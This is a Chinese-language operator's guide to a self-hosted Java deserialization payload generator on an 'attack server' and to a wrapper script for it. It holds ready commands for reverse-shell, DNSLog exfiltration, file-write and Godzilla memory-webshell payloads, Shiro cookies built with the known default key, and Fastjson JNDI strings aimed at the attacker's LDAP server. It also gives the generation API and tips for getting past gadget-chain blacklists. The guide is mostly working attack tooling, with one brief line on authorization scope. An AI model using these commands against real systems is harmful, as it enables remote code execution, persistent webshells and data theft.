# javachain — Java 反序列化链生成平台（vulhub/java-chains v2.0.0-beta7）

部署在攻击服务器 `<your-attack-server>:8011`，Web 平台，登录后可视化级联选择 payload → 链 → sink，也可 curl 直接调 API 批量生成。

**入口**：`http://<your-attack-server>:8011/`
**凭据**：`凭据经环境变量 JCHAIN_USER/JCHAIN_PASS 提供（自部署 javachain 服务）`
**服务管理**（服务器上）：`systemctl restart/stop javachain`，目录 `/root/infra/javachain/java-chains-2.0.0-beta7-linux-amd64/`

## 一键工具（推荐，jchain.py）

**`python jchain.py <场景> [参数]`** 一条命令生成，免手写 curl JSON：

```bash
cd D:\Desktop\Claude\tools\javachain
# Java 原生反序列化（通用反序列化点，最常用载体 JavaNativePayload）
python jchain.py native -c CommonsBeanutils1 --exec "whoami"              # 命令执行字节流
python jchain.py native -c CommonsCollectionsK1 --tomcat-echo            # 带 TomcatEcho 回显
python jchain.py native -c CommonsBeanutils1 --oneforall-echo --header X-Token  # 全容器通用回显
python jchain.py native -c CommonsBeanutils1 --dnslog xxx.dnslog.cn      # DNSLog 外带
python jchain.py native -c CommonsCollectionsK1 --reverse-shell IP PORT  # 反弹 shell
python jchain.py native -c CommonsBeanutils1 --write-file /tmp/x "b64.." # 写文件
python jchain.py native -c CommonsBeanutils1 --memshell --server Tomcat --pass p --key k  # Godzilla 内存马
# 各反序列化载体
python jchain.py shiro   -k kPH+bIxk5D2deZiIxcaaaA== --exec "whoami"     # Shiro rememberMe cookie
python jchain.py hessian -c XString1 --exec "whoami"                     # Hessian2 字节流(必须 XString1)
python jchain.py xstream -c Rome1 --exec "whoami"                        # XStream XML
python jchain.py fastjson --jndi ldap://<your-attack-server>:1389/Basic/Command/Base64/xxxx  # @type JSON
python jchain.py jdbc-h2 --exec "id"                                     # H2 恶意 JDBC 连接串
python jchain.py xmldec  --exec "id"                                     # XMLDecoder XML
# 辅助
python jchain.py list [payload]   # 列载体 / 某载体的可用链
python jchain.py params <gadget>  # 查某链参数与 nextGadgets
python jchain.py raw -o p.bin -c CommonsBeanutils1 --exec "whoami"       # 存原始字节流直接 POST
```

二进制载体（native/hessian）输出 base64 字节流，`--raw` 打印解码、`-o` 存文件；文本载体（fastjson/jdbc/xml/shiro）直接打印明文 payload。

## 能做什么

| 能力 | 说明 |
|------|------|
| Shiro rememberMe payload | 指定 key + 链 + sink，生成 base64 cookie |
| 30 种 payload 类型 | AMF3 / 字节码 / 表达式 / FakeMySQL(读文件SSRF/爆破) / Fastjson / Hessian1+2 / JDBC / JNDI(LDAP/RMI) / JRMP / JSF / ObjectPayload / OpenAM / XMLDecoder / XStream 等 |
| 64 条 gadget 链 | CB1-5 / CCK1-4 / Jdk7u21 / JRE8u20 / BeanShell1-2 / Groovy / Clojure / Jython / Rhino3 / Rome1-4 / AspectJWeaver / Click1 / FileUpload1 / Jackson / Fastjson2 / JSON1 / SpringJndi2 / URLDNS / JRMPClient / FindClass 探测 等 |
| 多级 sink | TemplatesImpl(字节码) / JdbcRowSetImpl / C3p0DataSource / DruidDataSource / LdapAttribute / TWrap / SignedObject / Hiber2jdbc / 各数据库 DataSource / 内存马 |
| 协议服务 | JNDI LDAP/RMI 服务端 / FakeMySQL / JRMPListener / HTTP / TCP 服务器挂载 |

**相比本地 shirokit.py 的增量**：shirokit 只有 CB/CC 系 15 链；javachain 多出 **BeanShell / Groovy / Clojure / Rome / Jdk7u21 / JRMPClient / Jackson** 等黑名单绕过链，且支持 Fastjson/Hessian/JDBC/JNDI 全套——目标被 Shiro 1.4.2+ 黑名单拦 CB/CC 时切这些链。

## 登录流程（curl）

```bash
UA="Mozilla/5.0"; BASE="http://<your-attack-server>:8011"
# 1. 拿 XSRF-TOKEN cookie
curl -s -c /tmp/jc_ck.txt "$BASE/" -H "User-Agent: $UA" > /dev/null
XSRF=$(grep XSRF-TOKEN /tmp/jc_ck.txt | awk '{print $NF}')
# 2. 登录得 JSESSIONID
curl -s -b /tmp/jc_ck.txt -c /tmp/jc_ck.txt -X POST "$BASE/auth/login" \
  -H "User-Agent: $UA" -H "Content-Type: application/json" -H "X-XSRF-TOKEN: $XSRF" \
  -d '{"username":"admin","password":"<JCHAIN_PASS环境变量>"}'
# 3. 后续请求统一带
AUTH="-b /tmp/jc_ck.txt -H \"User-Agent: $UA\" -H \"X-XSRF-TOKEN: $XSRF\""
```

## 常用 API

```bash
# payload 类型列表（30 种）
curl -s $AUTH "$BASE/api/payloads"
# 某 payload 可用的 gadget 链（如 Shiro → 64 条链）
curl -s $AUTH "$BASE/api/gadgets/starts?payload=ShiroPayload"
# 某链的参数与 nextGadgets
curl -s $AUTH "$BASE/api/gadgets/CommonsBeanutils1"
```

## 生成 payload（POST /api/generate）

**请求体格式（关键，易错）**：
```json
{
  "payload": {"type": "ShiroPayload", "encode": "base64", "options": {"urlEncoding": false}},
  "chain": [
    {"gadget": "ShiroPayload", "args": {"shiroKey": "kPH+bIxk5D2deZiIxcaaaA==", "gcmMode": false, "dirtyLength": 0}},
    {"gadget": "CommonsBeanutils1", "args": {}},
    {"gadget": "TemplatesImpl", "args": {}},
    {"gadget": "BytecodeFromJavaSource", "args": {"sourceCode": "public class UserClass { ... }"}}
  ]
}
```
- `encode` 是字符串 `"base64"`，不是对象
- 链参数放**末级 sink**（如 BytecodeFromJavaSource.sourceCode），中间 gadget 传 `args:{}`
- 返回值：`data.output.content` = base64 rememberMe 值（Shiro 直接用）；`data.meta.chain` = 实际用到的链

## 使用场景速查

| 场景 | 链选择 | 说明 |
|------|--------|------|
| Shiro 默认 key 打点 | ShiroPayload + CB1 + TemplatesImpl + 字节码 | 生成 cookie 值直接打 rememberMe |
| Shiro 黑名单绕过 | ShiroPayload + BeanShell1/Groovy/Jdk7u21 + ... | 目标拦 CB/CC 时换链 |
| Fastjson | FastjsonPayload + Fastjson 链 | 生成 @type payload |
| 高版本 JDK JNDI | JNDIRefBypassPayload / JNDIResourceRefPayload | 绕过 trustURLCodebase |
| 读目标文件 | FakeMySQLReadPayload | Fake MySQL 协议读文件 / SSRF |
| 探测可用类 | FindClass / FindClassByBomb | 先探测目标类再选链 |

## 实操心得与关键约束（2026-08-14 实测）

1. **架构模型 = 三层**：`载体(payload, 决定输出格式) → 触发链(gadget, 触发机制) → 内置payload(BytecodeConvert 级联 50+ 种 RCE 形态)`
2. **`chain` 首元素必须是载体本体 gadget**（`{"gadget":"JavaNativePayload","args":{}}`），否则报 `first gadget must be a payload`
3. **tag 校验强制连续**：中间链必须匹配上一级 nextTags，不能跳级。典型：Hessian 必须 `XString1`(Action.ToString) → `RomeToStringBean1`(Action.ToString) → `TemplatesImpl` → 内置payload；BeanShell1 也要先走 Beanstalk 表达式 tag
4. **通用原生反序列化输出用 `JavaNativePayload`（63 链）**，不是 ObjectPayload！ObjectPayload 载体拒绝 HashSet/HashMap/PriorityQueue 根类型（CB/URLDNS/CCK 全报 `not supported payload result type`）
5. **BytecodeConvert = 金矿**：TemplatesImpl → BytecodeConvert → 直接选内置 payload：`Exec(cmd)` / `TomcatEcho(header)` / `OneForAllEcho(header)` / `DNSLog(dnslog)` / `ReverseShell(ip,port)` / `WriteFileExec(path,b64)` / `MemShellPartyGadget(server,shellType,shellTool,pass,key)` / `ServerDetectorWithDNSLog` 等，自带字节码混淆开关
6. **encode=base64 只对二进制载体生效**：native/hessian 返回 base64 字节流；fastjson/jdbc/xml/shiro 返回明文（shiro 是 base64 cookie）
7. **sourceCode 含引号/特殊字符**时用 Python/JSON 构造请求体，避免 shell 转义炸 JSON
8. Fastjson 载体内置 14 条专链（FastjsonC3p0/Dns/Groovy/写文件/MySQL 外带/PostgreSQL），不必只靠通用链

## 注意

- 服务端有攻击面：默认需认证才 403，勿开 `CHAINS_AUTH=false` 无认证模式
- 生成仅本地服务端组装，**投递/发布到协议服务（JRMP/FakeMySQL）才会对目标出站**，确认授权范围
